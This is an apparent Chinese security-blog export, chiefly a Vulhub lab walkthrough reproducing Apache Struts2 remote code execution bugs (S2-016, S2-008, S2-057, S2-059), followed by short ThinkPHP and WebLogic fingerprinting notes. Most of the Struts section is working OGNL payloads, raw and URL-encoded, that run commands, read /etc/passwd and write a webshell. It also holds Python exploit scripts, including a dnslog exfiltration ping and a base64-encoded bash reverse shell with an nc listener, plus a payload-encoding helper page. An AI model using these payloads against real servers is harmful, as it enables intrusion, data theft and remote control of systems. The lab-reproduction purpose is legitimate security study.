S2-059）","slug":"struts2漏洞复现（S2-016-S2-008-S2-019-S2-057-S2-059）","date":"2022-10-18T10:02:17.000Z","updated":"2024-11-12T06:59:13.000Z","comments":true,"path":"2022/10/18/struts2漏洞复现（S2-016-S2-008-S2-019-S2-057-S2-059）/","permalink":"https://gryffinbit.top/2022/10/18/struts2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88S2-016-S2-008-S2-019-S2-057-S2-059%EF%BC%89/","excerpt":"","text":"实验环境 Vulhub靶场，struts2漏洞复现 Ubuntu: 腾讯云服务器，Ubuntu Server 20.04 LTS 64bit 靶场：https://github.com/vulhub/vulhub.git 前言前期知识储备，跳转blog：https://gryffinbit.top/2022/10/14/struts%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8Aognl%E8%A1%A8%E8%BE%BE%E5%BC%8F/ 漏洞原理S2-016 更详细的逆向过程👇 https://blog.csdn.net/Fly_hps/article/details/85035223 struts2的action、redirect、redirectAction前缀参数，在实现其功能的过程中使用了Ognl表达式，并将用户通过URL提交的内容拼接进Ognl表达式中，从而造成攻击者可以通过构造恶意URL来执行任意Java代码，今儿可执行任意命令。 redirect: 和 redirectAction: 此两项前缀为Struts默认开启功能。 在struts2中，DefaultActionMapper类支持以&quot;action:&quot;、“redirect:”、&quot;redirectAction:&quot;作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令. 访问http://ip/index.action?redirect:OGNL表达式即可执行OGNL表达式。 S2-008S2-008涉及多个漏洞，cookie拦截器配置错误可造成ognl表达式执行，但是由于大多web容器对cookie名称都有字符限制，所以这个漏洞不常用。 生产环境一般不会存在该漏洞，但是开了debug模式就可以直接执行命令 S2-057远程代码执行漏洞。 影响版本： &lt;&#x3D; Struts 2.3.34, Struts 2.5.16 利用条件： alwaysSelectFullNamespace值为true Struts2配置文件中，action元素未设置namespace属性，或使用了通配符 漏洞分析： 通过TextParseUtil.translateVariables()调用OgnlTextParser.evaluate()解析执行url中的OGNL表达式，导致代码执行 S2-059由于标签属性值进行二次表达式解析而产生的命令注入漏洞 利用条件： 必须开启AltSyntax（它的功能是将标签内的内容当作ognl表达式解析。） 版本为 Struts 2.0.0 - Struts 2.5.20 漏洞分析 对id属性进行二次解析，导致命令注入。 第一次解析：一步步调用，最终调用了OgnlTextParser.evaluate()方法。进行了解析 第二次解析：调用了&#96;&#96;findStringIfAltSyntax()方法，开启altSyntax功能的话，则会对id&#96;属性再次进行表达式解析。 漏洞复现S2-016 进入靶场 http://ip:8080/ 系统命令执行POC 执行命令name -a 1redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(&quot;uname -a&quot;).getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()&#125; 需要先将POC进行一次url编码： 1redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22uname%20-a%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D 拼接上靶场地址 http://ip:8080/index.action 1http://ip:8080/index.action?redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22uname%20-a%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D 得到一个下载文件 修改文件后缀为.html，得到执行结果 可以得到用户b2fdbd82760b，实际上它是docker的容器ID （docker漏洞靶场视角👇） 解密Linux版本信息 1Linux b2fdbd82760b 5.4.0-96-generic #109-Ubuntu SMP Wed Jan 12 16:49:16 UTC 2022 x86_64 GNU/Linux 1234567Linux –- 内核名称b2fdbd82760b–- 节点名x86_64 –- 机器硬件名5.4.0-96-generic –- 内核发布版本 #109-Ubuntu SMP Wed Jan 12 16:49:16 UTC 2022 -- 内核版本GNU/Linux –- 操作系统 其他的还有：处理器、硬件平台。这里没有显示，大部分是x86_64 内核发行数据 123455 表示内核版本4 表示主要版本0 表示次要版本96 表示最新补丁 #109 表示此发布版本已经编译了109次 获取web目录POC POC 1redirect:$&#123;#req=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletReq&#x27;+&#x27;uest&#x27;),#resp=#context.get(&#x27;co&#x27;+&#x27;m.open&#x27;+&#x27;symphony.xwo&#x27;+&#x27;rk2.disp&#x27;+&#x27;atcher.HttpSer&#x27;+&#x27;vletRes&#x27;+&#x27;ponse&#x27;),#resp.setCharacterEncoding(&#x27;UTF-8&#x27;),#ot=#resp.getWriter (),#ot.print(&#x27;web&#x27;),#ot.print(&#x27;path:&#x27;),#ot.print(#req.getSession().getServletContext().getRealPath(&#x27;/&#x27;)),#ot.flush(),#ot.close()&#125; URL编码 1redirect%3A%24%7B%23req%3D%23context.get(%27co%27%2B%27m.open%27%2B%27symphony.xwo%27%2B%27rk2.disp%27%2B%27atcher.HttpSer%27%2B%27vletReq%27%2B%27uest%27)%2C%23resp%3D%23context.get(%27co%27%2B%27m.open%27%2B%27symphony.xwo%27%2B%27rk2.disp%27%2B%27atcher.HttpSer%27%2B%27vletRes%27%2B%27ponse%27)%2C%23resp.setCharacterEncoding(%27UTF-8%27)%2C%23ot%3D%23resp.getWriter%20()%2C%23ot.print(%27web%27)%2C%23ot.print(%27path%3A%27)%2C%23ot.print(%23req.getSession().getServletContext().getRealPath(%27%2F%27))%2C%23ot.flush()%2C%23ot.close()%7D 拼接靶场地址 1http://ip:8080/index.action?redirect%3A%24%7B%23req%3D%23context.get(%27co%27%2B%27m.open%27%2B%27symphony.xwo%27%2B%27rk2.disp%27%2B%27atcher.HttpSer%27%2B%27vletReq%27%2B%27uest%27)%2C%23resp%3D%23context.get(%27co%27%2B%27m.open%27%2B%27symphony.xwo%27%2B%27rk2.disp%27%2B%27atcher.HttpSer%27%2B%27vletRes%27%2B%27ponse%27)%2C%23resp.setCharacterEncoding(%27UTF-8%27)%2C%23ot%3D%23resp.getWriter%20()%2C%23ot.print(%27web%27)%2C%23ot.print(%27path%3A%27)%2C%23ot.print(%23req.getSession().getServletContext().getRealPath(%27%2F%27))%2C%23ot.flush()%2C%23ot.close()%7D 得到web目录 写入webshell poc 1redirect:$&#123;#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=false,#f=#_memberAccess.getClass().getDeclaredField(&quot;allowStaticMethodAccess&quot;),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletRequest&quot;),#b=new java.io.FileOutputStream(new java.lang.StringBuilder(#a.getRealPath(&quot;/&quot;)).append(@java.io.File@separator).append(&quot;1.jspx&quot;).toString()),#b.write(#a.getParameter(&quot;t&quot;).getBytes()),#b.close(),#genxor=#context.get(&quot;com.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),#genxor.println(&quot;BINGO&quot;),#genxor.flush(),#genxor.close()&#125; url编码 1redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22)%2C%23b%3Dnew%20java.io.FileOutputStream(new%20java.lang.StringBuilder(%23a.getRealPath(%22%2F%22)).append(%40java.io.File%40separator).append(%221.jspx%22).toString())%2C%23b.write(%23a.getParameter(%22t%22).getBytes())%2C%23b.close()%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%22BINGO%22)%2C%23genxor.flush()%2C%23genxor.close()%7D 拼接靶场地址 1http://ip:8080/index.action?redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23_memberAccess%2Ctrue)%2C%23a%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletRequest%22)%2C%23b%3Dnew%20java.io.FileOutputStream(new%20java.lang.StringBuilder(%23a.getRealPath(%22%2F%22)).append(%40java.io.File%40separator).append(%221.jspx%22).toString())%2C%23b.write(%23a.getParameter(%22t%22).getBytes())%2C%23b.close()%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%22BINGO%22)%2C%23genxor.flush()%2C%23genxor.close()%7D 执行结果。上传成功 S2-008在devmode模式下直接添加参数?debug=command&amp;expression=&lt;OGNL EXP&gt;，会直接执行后面的ognl表达式，因此可以直接执行命令. 环境成功启动 文件读取 POC 1/devmode.action?debug=command&amp;expression=(#w=new java.io.File(&quot;/etc/passwd&quot;),#a=new java.io.FileInputStream(#w),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#d)),#f.getWriter().flush(),#f.getWriter().close()) 进行URL编码 1/devmode.action?debug=command&amp;expression=%28%23w%3Dnew%20java.io.File%28%22%2fetc%2fpasswd%22%29%2C%23a%3Dnew%20java.io.FileInputStream%28%23w%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read%28%23d%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new%20java.lang.String%28%23d%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%29 执行 命令执行 POC 执行的命令为读取/etc/passwd文件 1/devmode.action? debug=command&amp;expression=(#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[5000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()) URL编码 1/devmode.action?debug=command&amp;expression=%28%23a%3D%28new%20java.lang.ProcessBuilder%28new%20java.lang.String%5B%5D%7B%22cat%22%2C%22%2fetc%2fpasswd%22%7D%29%29.redirectErrorStream%28true%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew%20java.io.InputStreamReader%28%23b%29%2C%23d%3Dnew%20java.io.BufferedReader%28%23c%29%2C%23e%3Dnew%20char%5B5000%5D%2C%23d.read%28%23e%29%2C%23f%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29%2C%23f.getWriter%28%29.println%28new%20java.lang.String%28%23e%29%29%2C%23f.getWriter%28%29.flush%28%29%2C%23f.getWriter%28%29.close%28%29%29 执行 执行ls 1/devmode.action? debug=command&amp;expression=(#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;ls&quot;&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[5000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()) 编码 1http://localhost:8080/devmode.action?debug=command&amp;expression=(%23a%3D(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%7B%22ls%22%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew%20java.io.InputStreamReader(%23b)%2C%23d%3Dnew%20java.io.BufferedReader(%23c)%2C%23e%3Dnew%20char%5B5000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new%20java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()) S2-057环境启动 http://localhost:8080/struts2-showcase 验证漏洞是否存在 进行一个算数，看是否返回结果 &#123;7*7&#125;要进行url编码，结果如下 1http://your-ip:8080/struts2-showcase/$%7B7*7%7D/actionChain1.action 抓包，得到了算数结果49.说明存在该漏洞 POC验证 1http://ip:8080/struts2-showcase/&lt;ognl表达式&gt;/actionChain1.action 执行系统命令 id 12$&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#x27;struts.valueStack&#x27;].context).(#cr=#ct[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))&#125; url编码 12%24%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B%27struts.valueStack%27%5D.context).(%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27id%27)).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D/actionChain1.action 执行其他命令的结果(ls)👇 S2-059该漏洞跟057差不多，它利用的是id标签的二次解析。 环境启动 http://ip:8080/.action 验证漏洞是否存在 1http://your-ip:8080/?id=%25%7B233*233%7D 可以计算出233*233的结果 官方POC验证 12345678910111213import requestsurl = &quot;http://127.0.0.1:8080&quot;data1 = &#123; &quot;id&quot;: &quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;&#125;data2 = &#123; &quot;id&quot;: &quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;touch /tmp/success&#x27;))&#125;&quot;&#125;res1 = requests.post(url, data=data1)# print(res1.text)res2 = requests.post(url, data=data2)# print(res2.text) 执行poc后，进入容器，发现命令touch /tmp/success被成功执行，生成了success文件。 其他POC验证方式 DNSlog带出回显 回显，可以修改成ping xxx.dnslog.cn，直接执行，带出回显。 python执行 12345678910111213import requestsurl = &quot;http://127.0.0.1:8080&quot;data1 = &#123; &quot;id&quot;: &quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;&#125;data2 = &#123; &quot;id&quot;: &quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;ping erp3sn.dnslog.cn&#x27;))&#125;&quot;&#125;res1 = requests.post(url, data=data1)# print(res1.text)res2 = requests.post(url, data=data2)# print(res2.text) 反弹shell base编码小工具 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;java runtime exec usage...&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;Input type: &lt;input type=&quot;radio&quot; id=&quot;bash&quot; name=&quot;option&quot; value=&quot;bash&quot; onclick=&quot;processInput();&quot; checked=&quot;&quot;&gt;&lt;label for=&quot;bash&quot;&gt;Bash&lt;/label&gt; &lt;input type=&quot;radio&quot; id=&quot;powershell&quot; name=&quot;option&quot; value=&quot;powershell&quot; onclick=&quot;processInput();&quot;&gt;&lt;label for=&quot;powershell&quot;&gt;PowerShell&lt;/label&gt; &lt;input type=&quot;radio&quot; id=&quot;python&quot; name=&quot;option&quot; value=&quot;python&quot; onclick=&quot;processInput();&quot;&gt;&lt;label for=&quot;python&quot;&gt;Python&lt;/label&gt; &lt;input type=&quot;radio&quot; id=&quot;perl&quot; name=&quot;option&quot; value=&quot;perl&quot; onclick=&quot;processInput();&quot;&gt;&lt;label for=&quot;perl&quot;&gt;Perl&lt;/label&gt;&lt;/p&gt; &lt;p&gt;&lt;textarea rows=&quot;10&quot; style=&quot;width: 100%; box-sizing: border-box;&quot; id=&quot;input&quot; placeholder=&quot;Type Bash here...&quot;&gt;&lt;/textarea&gt; &lt;textarea rows=&quot;5&quot; style=&quot;width: 100%; box-sizing: border-box;&quot; id=&quot;output&quot; onclick=&quot;this.focus(); this.select();&quot; readonly=&quot;&quot;&gt;&lt;/textarea&gt;&lt;/p&gt; &lt;script&gt; var taInput = document.querySelector(&#x27;textarea#input&#x27;); var taOutput = document.querySelector(&#x27;textarea#output&#x27;); function processInput() &#123; var option = document.querySelector(&#x27;input[name=&quot;option&quot;]:checked&#x27;).value; switch (option) &#123; case &#x27;bash&#x27;: taInput.placeholder = &#x27;Type Bash here...&#x27; taOutput.value = &#x27;bash -c &#123;echo,&#x27; + btoa(taInput.value) + &#x27;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;; break; case &#x27;powershell&#x27;: taInput.placeholder = &#x27;Type PowerShell here...&#x27; poshInput = &#x27;&#x27; for (var i = 0; i &lt; taInput.value.length; i++) &#123; poshInput += taInput.value[i] + unescape(&quot;%00&quot;); &#125; taOutput.value = &#x27;powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc &#x27; + btoa(poshInput); break; case &#x27;python&#x27;: taInput.placeholder = &#x27;Type Python here...&#x27; taOutput.value = &quot;python -c exec(&#x27;&quot; + btoa(taInput.value) + &quot;&#x27;.decode(&#x27;base64&#x27;))&quot;; break; case &#x27;perl&#x27;: taInput.placeholder = &#x27;Type Perl here...&#x27; taOutput.value = &quot;perl -MMIME::Base64 -e eval(decode_base64(&#x27;&quot; + btoa(taInput.value) + &quot;&#x27;))&quot;; break; default: taOutput.value = &#x27;&#x27; &#125; if (!taInput.value) taOutput.value = &#x27;&#x27;; &#125; taInput.addEventListener(&#x27;input&#x27;, processInput, false); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 编码 python执行 12345678910111213import requestsurl = &quot;http://192.168.0.14:8080&quot;data1 = &#123; &quot;id&quot;: &quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses(&#x27;&#x27;)).(#ognlUtil.setExcludedPackageNames(&#x27;&#x27;))&#125;&quot;&#125;data2 = &#123; &quot;id&quot;: &quot;%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yMTEuNTUuNS82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;))&#125;&quot;&#125;res1 = requests.post(url, data=data1)# print(res1.text)res2 = requests.post(url, data=data2)# print(res2.text) 监听 1nc -lvnp 6666 攻击测试成功 参考文章https://blog.csdn.net/weixin_42633229/article/details/117087180 https://www.51cto.com/article/621101.html https://www.codercto.com/a/22088.html https://zhuanlan.zhihu.com/p/348999160 https://github.com/vulhub/vulhub/tree/master/struts2/ https://blog.csdn.net/T780000063/article/details/111054037","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"struts2","slug":"struts2","permalink":"https://gryffinbit.top/tags/struts2/"}],"author":"Gryffinbit"},{"title":"thinkphp介绍","slug":"thinkphp介绍","date":"2022-10-17T18:49:26.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/10/18/thinkphp介绍/","permalink":"https://gryffinbit.top/2022/10/18/thinkphp%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"介绍​ ThinkPHP是开源轻量级PHP框架。PHP框架是许多代码的集合，这些代码是程序结构的代码（并不是业务代码），代码中有许多函数、类、功能类包，框架的代码按照一定的标准组成了一个有机功能体，这个功能体中有许多设计模式，比如MVC、单例、AR等 ​ ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，诞生于2006年初，原名FCS，2007年元旦正式更名为ThinkPHP，遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib（标签库）、RoR的ORM映射和ActiveRecord模式。 ThinkPHP可以支持windows&#x2F;Unix&#x2F;Linux等服务器环境，正式版需要PHP5.0以上版本支持，支持MySql、PgSQL、Sqlite多种数据库以及PDO扩展，ThinkPHP框架本身没有什么特别模块要求，具体的应用系统运行环境要求视开发所涉及的模块。 作为一个整体开发解决方案，ThinkPHP能够解决应用开发中的大多数需要，因为其自身包含了底层架构、兼容处理、基类库、数据库访问层、模板引擎、缓存机制、插件机制、角色认证、表单处理等常用的组件，并且对于跨版本、跨平台和跨数据库移植都比较方便。并且每个组件都是精心设计和完善的，应用开发过程仅仅需要关注业务逻辑。 框架文件介绍 解压后得到 123456Application --应用程序目录,当程序开发时自动生成,默认为空;Public --公共资源文件目录,存放一些公用的文件,默认为空; ThinkPHP --框架目录,框架的核心架构程序包; README.md --说明文件,可删;.htaccess --配置文件,一般用于配置伪静态; Index.php --入口文件,所有程序都通过这里访问。 对于 ThinkPHP 框架目录内,也含有大量的目录及文件: 12345678910111213141516Common --核心公共函数目录Conf --核心配置目录Lang --核心语言包目录Library --框架类库目录 |--Think --核心 Think 类库包目录 |--Behavior --行为类库目录 |--Org --Org 类库包目录 |--Vendor --第三方类库目录 |--... --更多类库目录Mode --框架应用模式目录Tpl --系统模版目录LICENSE.txt --框架授权协议文件logo.png --框架 LOGO 文件README.txt --框架 README 文件index.php --框架入口文件 判断网站是否为thinkphp在URL里添加字符，看报错内容","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"thinkphp","slug":"thinkphp","permalink":"https://gryffinbit.top/tags/thinkphp/"}],"author":"Gryffinbit"},{"title":"weblogic介绍","slug":"weblogic介绍","date":"2022-10-14T09:58:59.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/10/14/weblogic介绍/","permalink":"https://gryffinbit.top/2022/10/14/weblogic%E4%BB%8B%E7%BB%8D/","excerpt":"","text":"weblogic介绍weblogic是oracle出品的应用服务，是一个基于JAVAEE架构的中间件。BEA Weblogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器 下载部署。https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html 默认端口7001 快速判断网站是否使用weblogicweblogic指纹特征判断输入一个不存在的URL路径，看Web服务是否返回如下“From RFC 2068Hypertext Transfer Protocol”关键字，即可判断出是否使用Weblogic中间件来。 Weblogic内置URL路径判断对于有些网站屏蔽了404错误回显的情况，可以通过访问Weblogic内置Web目录是否存在去间接去判断是否使用了Weblogic中间件。比如/consolehelp/、/bea_wls_internal/、/console/等路径是Weblogic专有的，再比如说可以访问Weblogic专有的漏洞CVE-2017-10271、CVE-2019-2729等对应的URL路径(&#x2F;wls-wsat&#x2F;、&#x2F;_async&#x2F;等)，但是这个方法不推荐使用，因为基本上都会被WAF拦截，更严重的情况是会导致封IP，导致后续正常路径也无法判断出来，而且大多数甲方客户修复漏洞的方法，就是直接删除存在漏洞的war包，导致这两个路径也不存在。 判断版本号访问console目录 访问&#x2F;console&#x2F;目录，左下角会有weblogic版本号 通过T3协议获取 通过T3协议可以直接获取Weblogic版本号，缺点是现在Weblogic的T3直接暴露在公网上的情况很少了，很多时候在前面会放置一个nginx反向代理，这种情况下，T3识别版本号的方法就用不了了。 可以使用nmap去识别 1nmap 192.168.237.235 -p 7130 --script=&quot;weblogic-t3-info.nse&quot; -v -Pn -n -sV --open -T4 还可以从GitHub上下载T3协议的发包代码，修改一下，直接把T3协议的返回包输出，就可以直接看到版本号了。 通过CVE-2022-21371文件包含漏洞判断 这个漏洞是2022年出现的漏洞，是一个文件包含漏洞，通过这个漏洞可以跳转目录对Weblogic的&#x2F;WEB-INF&#x2F;xml、jsp、html文件等进行文件读取。这也是被大家忽略的一个Nday漏洞，在这里，我们可以用这个漏洞，间接判断出weblogic的版本号。 思路是，fast_track.html这个文件的显示内容有个时间，每一个细微版本大致对应着一个weblogic的细微版本号，用来做版本识别恰到好处。 访问.&#x2F;&#x2F;fast_track.html，如下图所示，对于Weblogic的12.2.1.3.0版本，此文件回显时间内容是1996，2017 通过返回头判断 参考文章https://blog.csdn.net/m0_71692682/article/details/126697298","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"weblogic","slug":"weblogic","permalink":"https://gryffinbit.top/tags/weblogic/"}],"author":"Gryffinbit"},{"title":"struts介绍以及ognl表达式","slug":"struts介绍以及ognl表达式","date":"2022-10-14T09:58:38.000Z","updated":"2024-11-12T06:59:12.000Z","comments":true,"path":"2022/10/14/struts介绍以及ognl表达式/","permalink":"https://gryffinbit.top/2022/10/14/struts%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8Aognl%E8%A1%A8%E8%BE%BE%E5%BC%8F/","excerpt":"","text":"struts的历史和用途Struts 是一个开源框架，用于扩展 Java Servlet API 并使用模型、视图、控制器(MVC) 体系结构。通过此框架，您可以基于各种标准技术（如 JSP 页、JavaBeans、资源包和 XML）创建可维护、可扩展并且灵活的 Web 应用程序。 使用 Struts 时，此框架将为您提供一个控制器 Servlet (ActionServlet)，它在 IDE 中包含的 Struts 库中定义，并自动在 web.xml 部署描述符中注册 该控制器 Servlet 使用 struts-config.xml 文件将传入请求映射到 Struts Action 对象，并实例化与暂时存储窗体数据的操作相关联的任何 ActionForm 对象。Action 对象在使用窗体 Bean 中存储的任何数据的同时，使用其 execute 方法处理请求。一旦 Action 对象处理了请求，它就将存储任何新数据（即，存储在窗体 Bean 或单独的结果 Bean 中），并将结果转发到相应的视图中。 Struts 是 Apache 软件基金会（Apache Software Foundation）资助的一个为开发基于MVC模式应用架构的开源框架，是利用Java Servlet和JSP、XML等方面的技术来实现构建Web应用的一项非常有用的技术，它也是基于MVC模式的Web应用最经典框架。 Struts框架的主要架构设计和开发者是Craig R.McClanahan。Struts 是目前Java Web MVC框架中不争的王者。经过长达五年的发展，Struts已经逐渐成长为一个稳定、成熟的框架，并且占有了MVC框架中最大的市场份额。 Struts把Servlet、JSP、自定义标签和信息资源(message resources)整合到一个统一的框架中，主要由一系列的框架类、辅助类和定制的JSP标记库构成。开发人员利用其进行开发时不用再自己编码实现全套MVC模式，极大的节省了时间。 ognl表达式OGNL是Object-Graph Navigation 